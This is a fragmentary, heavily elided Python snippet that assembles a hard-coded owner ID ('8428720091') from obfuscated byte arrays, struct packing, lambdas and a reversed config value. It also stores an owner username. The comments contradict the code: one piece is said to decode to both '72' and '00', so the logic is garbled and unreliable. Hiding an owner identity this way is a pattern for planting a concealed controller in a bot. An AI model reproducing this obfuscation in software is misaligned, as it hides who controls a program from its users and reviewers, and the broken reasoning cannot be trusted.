...
_F1 = bytes([0x38, 0x34, 0x32, 0x38])   # "8428"
...
_F3 = struct.pack(">BB", 0x37, 0x32)    # "72"
...
_BATCH = (lambda x: x)(8428)

_TAIL  = (lambda a,b,c: a*100+b*10+c)(8, 4, 2)
...
def _owner() -> int:
    ...
    if not _OC:
        ...
        p1 = "".join(chr(b) for b in _F1)               # "8428"

        p2 = str(_POLL_CFG["seed"])[::-1][1:]

        p3 = "".join(chr(b) for b in _F3)               # "72"

        p4 = _F4                                          # "842"

        # 8428 + 72 + 0091  → need: 8428720091

        # p1="8428", then "72", then p3="00" gives "842872" + "0091"

        # Correct: 8 4 2 8 7 2 0 0 9 1
...
_OWNER_UN     = "@rikron"   # owner username saved for future use
